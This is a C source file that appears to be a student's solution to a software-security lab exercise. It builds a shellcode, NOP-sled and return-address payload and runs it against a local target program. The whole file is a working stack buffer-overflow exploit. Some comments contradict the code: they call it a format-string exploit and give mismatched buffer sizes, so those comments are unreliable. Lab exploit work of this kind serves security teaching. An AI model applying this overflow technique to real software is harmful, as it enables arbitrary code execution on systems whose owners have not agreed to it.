#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

///// IN Foo: 
//rip at 0x3021fea8
//0x3021fea8: 0x00400da0
//Therefore, the return address once main completes, is 0x00400da0
//p &buf
//$1 = (char (*)[1024]) 0x3021faa0
//Therefore, the address of buf is 0x3021faa0 to 0x3021faa0+400 = 0x3021FEA0

//The difference between the rip (program counter) and the address of buf is 0x3021fea8 - 0x3021faa0 = 0x408 = 1032
//Then we need to fill the buffer with 1032 bytes of shellcode, and No-OPs
//Then 4 bytes of the return address of buffer (0x3021faa0)
//Followed by a '\0'

#define BUF_SIZE 1037
#define NOP 0x90

int 
main(void)
{
  char *args[3];
  char *env[1];

  char formatStringExploit[BUF_SIZE];

  //Use format string exploit to overwrite the return address of main

	//Fill the first bytes with shellcode
	int i;
	for (i = 0; i < strlen(shellcode); i++) {
		formatStringExploit[i] = shellcode[i];
	}

	//Fill the remaining bytes with No-OPs
	for (; i < BUF_SIZE - 5; i++) {
		formatStringExploit[i] = NOP;
	}

	//Fill the last bytes with the return address of buffer
	int *newReturnAddress = (int *)&formatStringExploit[BUF_SIZE - 5];

	*newReturnAddress = 0x3021faa0;

	//The formatStringExploit string will end with NULL
  formatStringExploit[1036] = '\0';

  args[0] = TARGET; 
  //args[1] = "hi there";
	args[1] = formatStringExploit;
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
